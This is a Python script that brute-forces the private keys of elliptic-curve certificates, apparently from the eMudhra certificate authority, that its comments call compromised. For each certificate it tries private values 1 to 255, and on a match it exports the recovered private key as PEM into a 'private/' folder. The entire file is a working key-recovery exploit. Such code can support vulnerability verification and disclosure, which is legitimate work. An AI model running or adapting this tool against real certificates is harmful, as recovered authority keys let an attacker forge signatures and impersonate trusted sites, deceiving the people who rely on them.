import re
from os import listdir

from Crypto.PublicKey import ECC
from Crypto.PublicKey.ECC import EccKey


def brute_force_emudhra_cert(pem_file_path):
    # 1. Load the certificate from disk
    try:
        with open(pem_file_path, "r", encoding="utf-8") as f:
            cert_data = f.read()
    except FileNotFoundError:
        print(f"Error: Could not find {pem_file_path}")
        return None

    # Extract PEM certificate block (supports files containing single or multiple certs)
    cert_match = re.search(
        r"-----BEGIN CERTIFICATE-----.*?-----END CERTIFICATE-----",
        cert_data,
        re.DOTALL,
    )
    if not cert_match:
        print(f"Error: No PEM certificate found in {pem_file_path}")
        return None

    # Parse certificate into an ECC public key object
    try:
        target_pub_key = ECC.import_key(cert_match.group(0))
    except (ValueError, TypeError, IndexError) as e:
        print(
            f"Error: Certificate does not contain a valid Elliptic Curve public key: {e}")
        return None

    # Ensure the target key is an Elliptic Curve public key
    if not isinstance(target_pub_key, EccKey) or target_pub_key.has_private():
        print("Error: Certificate does not contain an Elliptic Curve public key.")
        return None

    # Extract target coordinates
    target_point = (target_pub_key.pointQ.x, target_pub_key.pointQ.y)
    print(f"Loaded target public key from {pem_file_path}")

    # 2. Brute force the single-byte key (1 to 255)
    print("Starting brute force (1 to 255)...")

    # The compromised certificates used the NIST P-384 curve (SECP384R1)
    curve = target_pub_key.curve or "NIST P-384"

    for k in range(1, 256):
        # Derive a test private key from the integer 'k'
        test_priv_key = ECC.construct(curve=curve, d=k)
        test_pub_key = test_priv_key.public_key()

        # Compare the derived public coordinates to the target coordinates
        if (test_pub_key.pointQ.x, test_pub_key.pointQ.y) == target_point:
            print(f"[!] SUCCESS: Match found in {k} attempts!")
            print(f"[!] The compromised private key is: {k}")

            # (Optional) Export the recovered private key to a usable PEM format
            pem_key = test_priv_key.export_key(format="PEM", use_pkcs8=False)
            print("\nRecovered Private Key (PEM):\n" + pem_key)
            return pem_key

    print("[-] Failed: Private key is not within the 1-255 range.")
    return None


if __name__ == "__main__":
    # Example usage: Replace with the actual path to a downloaded PEM certificate
    # brute_force_emudhra_cert("emudhra_intermediate.pem")
    certs = listdir("pem")
    for cert in certs:
        cert_path = f"pem/{cert}"
        print(f"Processing certificate: {cert_path}")
        private_key = brute_force_emudhra_cert(cert_path)
        if private_key is not None:
            with open(f"private/{cert}", "w") as f:
                f.write(str(private_key))
